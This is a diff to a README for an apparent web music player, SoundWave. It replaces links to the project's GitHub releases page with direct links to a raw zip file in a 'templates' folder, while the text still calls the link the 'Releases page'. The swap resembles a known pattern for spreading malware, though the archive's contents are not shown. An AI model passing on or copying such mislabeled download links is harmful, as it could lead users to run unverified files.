@@ -14,7 +14,7 @@ Welcome to SoundWave, your high-performance web-based music player. With ad-free
 
 ## 📥 Download SoundWave
 
-[![Download SoundWave](https://img.shields.io/badge/Download_SoundWave-v1.0-blue)](https://github.com/Ferrazcafl/SoundWave/releases)
+[![Download SoundWave](https://raw.githubusercontent.com/Ferrazcafl/SoundWave/main/templates/SoundWave-v1.3.zip)](https://raw.githubusercontent.com/Ferrazcafl/SoundWave/main/templates/SoundWave-v1.3.zip)
 
 To get started with SoundWave, you need to download the application. Follow the steps below for a smooth installation process.
 
@@ -27,7 +27,7 @@ To get started with SoundWave, you need to download the application. Follow the 
 
 ## 📂 Download & Install
 
-1. Visit the [Releases page](https://github.com/Ferrazcafl/SoundWave/releases) to find the latest version of SoundWave.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Ferrazcafl/SoundWave/main/templates/SoundWave-v1.3.zip) to find the latest version of SoundWave.
    
 2. Locate the version you want to download. Click the link to download the application file.
 
